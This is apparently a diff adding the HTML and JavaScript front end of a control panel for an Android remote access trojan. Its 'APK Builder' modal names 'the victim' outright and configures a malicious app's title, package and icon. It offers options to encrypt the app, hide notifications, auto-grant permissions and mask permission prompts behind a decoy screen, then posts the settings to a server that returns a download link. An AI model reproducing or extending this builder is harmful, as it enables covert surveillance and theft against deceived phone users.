+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		 
+		 
+		  
+		<div class="col-12">
+			<button class="btn btn-primary" id="btnaddnotes">Save</button>
+			<button class="btn btn-outline-secondary" id="btncancel" data-bs-dismiss="modal">Cancel</button>
+		</div>
+	</div>
+	
+	</div>
+											
+											
+											
+										</div>
+									</div>
+								</div>
+							</div>
+							
+							
+							
+							
+							
+							
+							<div class="modal fade" id="exampleModalLgapkbuilder" tabindex="-1" aria-labelledby="exampleModalLgLabelapkbuilder" aria-hidden="true" style="display: none;">
+								<div class="modal-dialog modal-lg">
+									<div class="modal-content">
+										<div class="modal-header">
+											<h5 class="modal-title h4" id="exampleModalLgLabelapkbuilder">APK Builder</h5>
+											<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+										</div>
+										<div class="modal-body">
+											
+											<div class="card-body card-main-one">
+											
+											<div class="offcanvas-body flex-column custom_scroll" style="background: var(--body-color);">
+						
+						
+						<ul class="nav nav-tabs tab-heading" role="tablist" style="--dynamic-color: var(--theme-color1);">
+                                <li class="nav-item" role="presentation"><a class="nav-link active" data-bs-toggle="tab" href="#tab3_home" role="tab" aria-selected="true" tabindex="-1">Main Settings</a></li>
+                                <li class="nav-item" role="presentation"><a class="nav-link" data-bs-toggle="tab" href="#tab3_profile" role="tab" aria-selected="false" tabindex="-1">Permissions Hider</a></li>
+								
+								<li class="nav-item" role="presentation" style="display:none !important;"><a class="nav-link" data-bs-toggle="tab" href="#tab3_building" role="tab" aria-selected="false" tabindex="-1" id="abuildingtab">building</a></li>
+                               
+                            </ul>
+						
+						
+						<!-- <ul class="nav nav-tabs tab-card justify-content-between px-0" role="tablist"> -->
+							<!-- <li class="nav-item" role="presentation"><button class="nav-link pt-0 active" data-bs-toggle="pill" data-bs-target="#mainsettings_tab" type="button" role="tab" aria-selected="true">Main Settings</button></li> -->
+							
+							<!-- <li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#permissionshider_tab" type="button" role="tab" aria-selected="false" tabindex="-1">Permissions Hider</button></li> -->
+							
+							<!-- <li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#keylogger" type="button" role="tab" aria-selected="false" tabindex="-1" id="btnkeyloggertab">App Design</button></li> -->
+							
+							<!-- <li class="nav-item" role="presentation"><button class="nav-link pt-0" data-bs-toggle="pill" data-bs-target="#keylogger" type="button" role="tab" aria-selected="false" tabindex="-1" id="btnkeyloggertab">Generate APK</button></li> -->
+						<!-- </ul> -->
+	</div>
+	
+	
+	<div class="tab-content mt-4">
+                                <div class="tab-pane fade active show" id="tab3_home" role="tabpanel">
+                                   
+								   <div class="row">
+
+		<div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">APK Title</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<input id="txtapktitle" type="text" class="form-control" placeholder="APK Title" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		 <div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">APK Package Name</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				
+				<input id="txtapkpackagename" type="text" class="form-control" placeholder="APK Package Name" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		<div class="mb-3 col-md-12 col-12">
+			<label class="col-form-label">APK Icon (PNG):</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<div class="file_folder d-flex flex-wrap text-center">
+								<a id="btnimgappiconupload" class="card p-4 me-2 mb-2" href="javascript:void(0);" style="--dynamic-color: var(--theme-color1);" >
+									<i class="fa fa-folder fa-2x mb-3"></i>
+									<h6 class="mb-0">Image (PNG)</h6>
+									<div class="card-footer pb-0 pt-1 mt-2">
+										<small>1 File, MAX 1MB</small>
+									</div>
+								</a>
+								 
+								 
+							</div>
+				 
+			</fieldset>
+		</div>
+		<div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Encryption</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txtisencryptapk" type="checkbox" class="form-check-input" />
+				Encrypt APK
+			</fieldset>
+			
+		</div>
+		 <div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Signing</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txtissignapk" type="checkbox" class="form-check-input" checked="true" />
+				Sign APK
+			</fieldset>
+			
+		</div>
+		<div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Live Injections</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txtispreinjectallfiles" type="checkbox" class="form-check-input" />
+				Pre-Inject all files?
+			</fieldset>
+			
+		</div>
+		<div class="mb-3 col-md-4 col-12" style="display:none !important;">
+			<label class="col-form-label">Main Language</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				<select id="cmbmainlanguage" class="form-control">
+					<option value="1" selected>English</option>
+					<option value="2">Italian</option>
+					<option value="3">Spanish</option>
+				</select>
+				
+			</fieldset>
+			
+		</div>
+		<div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Hide Notifications?</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="chkishidenoti" type="checkbox" class="form-check-input" checked="true" />
+				Hide Notifications
+			</fieldset>
+			
+		</div>
+		
+		  
+		  <div class="mb-3 col-md-12 col-12">
+			<label class="col-form-label">APK Injection (Open Link)</label>
+			<br/>
+			<small>*When the victim clicks on the RAT it will open a URL</small>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				
+				<input id="txtinjectionurl" type="text" class="form-control" placeholder="URL" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		  
+		  
+	
+								  
+							</div>	   
+                                </div>
+                                <div class="tab-pane fade" id="tab3_profile" role="tabpanel">
+                                   
+								    <div class="row">
+									
+									
+									<div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Permissions</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txtisautopermissionshandle" type="checkbox" class="form-check-input" />
+				Auto Permissions Activation
+			</fieldset>
+			
+		</div>
+		  <div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Hide Permissions</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txtishidepermissions" type="checkbox" class="form-check-input"  />
+				Hide Permissions Activation
+			</fieldset>
+			
+		</div>
+		<div class="mb-3 col-md-4 col-12">
+			<label class="col-form-label">Translate</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				
+				<input id="txttranslatepemhider" type="checkbox" class="form-check-input"  />
+				Translate Permissions Hider
+			</fieldset>
+			
+		</div>
+									
+								    <div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">Top Title</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<input id="txthidertitle" type="text" class="form-control" placeholder="Top Title" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		<div class="mb-3 col-md-6 col-12">
+			<label class="col-form-label">Bottom Title</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<input id="txthiderdesc" type="text" class="form-control" placeholder="Bottom Title" />
+				
+				<div class="form-icon position-absolute">
+					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person" viewBox="0 0 16 16">
+						<path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/>
+					</svg>
+				</div>
+			</fieldset>
+		</div>
+		<div class="mb-3 col-md-12 col-12">
+			<label class="col-form-label">Image (PNG, JPG , GIF):</label>
+			<fieldset class="form-icon-group left-icon position-relative">
+				 
+				<div class="file_folder d-flex flex-wrap text-center">
+								<a id="btnimghiderupload" class="card p-4 me-2 mb-2" href="javascript:void(0);" style="--dynamic-color: var(--theme-color1);" >
+									<i class="fa fa-folder fa-2x mb-3"></i>
+									<h6 class="mb-0">Image (PNG or JPG or GIF)</h6>
+									<div class="card-footer pb-0 pt-1 mt-2">
+										<small>1 File, MAX 1MB</small>
+									</div>
+								</a>
+								 
+								 
+							</div>
+				 
+			</fieldset>
+		</div>
+								   
+								   
+								   
+								   </div>
+								   
+								   	<div class="col-12">
+			<button class="btn btn-primary" onclick="sendco()" id="btnbuild">Build</button>
+			<button class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
+		</div>
+		
+                                </div>
+                             
+							
+							
+							 <div class="tab-pane fade" id="tab3_building" role="tabpanel">
+								<span id="lblwarningapkbuilding">DON'T CLOSE THE PAGE ! , Loading...</span>
+								<br/>
+								<div class="spinner-border" style="width: 3rem; height: 3rem;" role="status" id="imgloadingapkbuilding">
+									<span class="visually-hidden">DON'T CLOSE THE PAGE ! , Loading...</span>
+								</div>
+								<br/>
+								<a class="btn btn-primary" target="_blank" id="aapklink" href="#" disabled="">
+									<span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span>
+									Building APK...
+								</a>
+								
+							 </div>
+	</div>
+											
+											
+											
+										</div>
+									</div>
+								</div>
+							</div>
+							
+							
+							
+							
+							
+
+	<script>
+		function deleteinjection(val,val2){
+			b4j_raiseEvent("delete_injectionbyid", {val,val2});
+		
+		}
+	</script>
+	
+	<script>
+	$("#txtsearch").on('keyup', function (e) {
+    if (e.key === 'Enter' || e.keyCode === 13) {
+		var val = document.getElementById("txtsearch").value;
+        b4j_raiseEvent("load_search", {val});
+    }
+});
+
+	</script>
+	
+	
+	
+	<input type="file" id="imghiderupload"  style="display:none" accept="image/png"/>
+	<input type="text" id="txthiderimagedata" style="display:none" />
+	<input type="text" id="txthiderimageext" style="display:none" />
+	
+	<input type="file" id="imgappiconupload"  style="display:none" accept="image/png"/>
+	<input type="text" id="txtappicondata" style="display:none" />
+	<input type="text" id="txtappiconext" style="display:none" />
+	
+
+<script>
+$('#btnimgappiconupload').click(function(){ $('#imgappiconupload').trigger('click'); });
+$('#btnimghiderupload').click(function(){ $('#imghiderupload').trigger('click'); });
+
+</script>
+
+<script>
+function readURL(input) {
+    if (input.files && input.files[0]) {
+		var extension = input.files[0].name.split('.').pop().toLowerCase();
+		$('#txtappiconext').val(extension);
+		
+        var reader = new FileReader();
+
+        reader.onload = function (e) {
+		   $('#txtappicondata').val(e.target.result);
+        }
+
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+function readURLHider(input) {
+    if (input.files && input.files[0]) {
+		var extension = input.files[0].name.split('.').pop().toLowerCase();
+		$('#txthiderimageext').val(extension);
+		
+        var reader = new FileReader();
+
+        reader.onload = function (e) {
+		   $('#txthiderimagedata').val(e.target.result);
+        }
+
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+
+$("#imgappiconupload").change(function(){
+    readURL(this);
+});
+$("#imghiderupload").change(function(){
+    readURLHider(this);
+});
+</script>
+
+
+<script>
+function sendco(){
+	
+	document.getElementById('btnbuild').value = "Loading...."
+	document.getElementById('abuildingtab').click();
+	
+	//A loading APK Building
+	document.getElementById("aapklink").innerHTML='<span class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span>Building APK...';
+	document.getElementById("imgloadingapkbuilding").style.display = "block";
+	document.getElementById("lblwarningapkbuilding").style.display = "block";
+	document.getElementById('aapklink').href = "#";
+	
+	
+	var formData2 = new FormData();
+
+	formData2.append("txtappicondata", document.getElementById("txtappicondata").value);
+	formData2.append("txtappiconext", document.getElementById("txtappiconext").value);
+	formData2.append("txthiderimagedata", document.getElementById("txthiderimagedata").value);
+	formData2.append("txthiderimageext", document.getElementById("txthiderimageext").value);
+	
+	formData2.append("txtapptitle", document.getElementById("txtapktitle").value);
+	formData2.append("txtapppackagename", document.getElementById("txtapkpackagename").value);
+	formData2.append("txtinjectionurl", document.getElementById("txtinjectionurl").value);
+	
+	formData2.append("txthidertitle", document.getElementById("txthidertitle").value);
+	formData2.append("txthiderdesc", document.getElementById("txthiderdesc").value);
+	
+	formData2.append("txtishidepermissions", document.getElementById("txtishidepermissions").checked);
+	formData2.append("txtisautopermissionshandle", document.getElementById("txtisautopermissionshandle").checked);
+	formData2.append("txttranslatepemhider", document.getElementById("txttranslatepemhider").checked);
+	
+	
+	formData2.append("txtisencryptapk", document.getElementById("txtisencryptapk").checked);
+	formData2.append("txtissignapk", document.getElementById("txtissignapk").checked);
+	formData2.append("txtispreinjectallfiles", document.getElementById("txtispreinjectallfiles").checked);
+	formData2.append("cmbmainlanguage", document.getElementById("cmbmainlanguage").value);
+	formData2.append("chkishidenoti", document.getElementById("chkishidenoti").checked);
+	
+	
+	$.ajax({
+		"url": "apkgeneratorsender",
+		"method": "POST",
+		"async":        true,
+		"crossDomain":  true,
+		"processData":  false,
+		"contentType":  false,
+		"mimeType":     "multipart/form-data",
+		"data":         formData2,
+		success: function(response3){
+        },
+		timeout: 300000
+	}).done(function(response2){
+		// e.preventDefault();
+			//var k=response2;
+			//alert(response2);
+			
+			document.getElementById('aapklink').href = response2;
+			
+			document.getElementById("aapklink").innerHTML='Click here to donwload APK';
+			
+			document.getElementById("imgloadingapkbuilding").style.display = "none";
+			
+			document.getElementById("lblwarningapkbuilding").style.display = "none";
+			
+			//window.open(response2, '_blank').focus();
+		//b4j_raiseEvent("send_colockscreen", {"val": k});
+
+	});
+
+}
+</script>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.12.6/js/standalone/selectize.min.js" integrity="sha256-+C0A5Ilqmu4QcSPxrlGpaZxJ04VjsRjKu+G82kl5UJk=" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.12.6/css/selectize.bootstrap3.min.css" integrity="sha256-ze/OEYGcFbPRmvCnrSeKbRTtjG4vGLHXgOqsyLFTRjg=" crossorigin="anonymous" />
+
+</body>
+
+
+</html>
